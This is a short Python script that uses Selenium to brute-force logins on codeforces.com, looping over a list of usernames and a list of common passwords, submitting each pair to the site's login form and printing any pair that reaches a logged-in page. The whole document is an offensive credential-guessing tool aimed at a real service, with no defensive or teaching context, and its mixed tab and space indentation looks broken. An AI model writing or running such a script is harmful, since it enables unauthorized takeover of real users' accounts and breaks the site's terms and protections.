from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup
import urllib

browser = webdriver.Firefox()

A = open('common.txt', 'r')
common = A.readlines()
B = open('leg.txt', 'r')
users  = B.readlines()

for element in users:
	ss = element
	print (ss)
        for password in common:
	        browser.get('https://codeforces.com/enter')
		userElem =  browser.find_element_by_id('handleOrEmail')
	  	userElem.send_keys(ss) # handle here	
		passwordElem =  browser.find_element_by_id('password')
	 	loginElem = browser.find_element_by_class_name('submit') 	
    		passwordElem.send_keys(password) # password here
   		loginElem.click()
		try:
			logoutElem=browser.find_element_by_link_text('Logout')
			logoutElem.click()	
			EnterElem=browser.find_element_by_link_text('Enter')
			EnterElem.click()
			print(ss, password)
	   		break
		except:
	   		continue
print ("done")
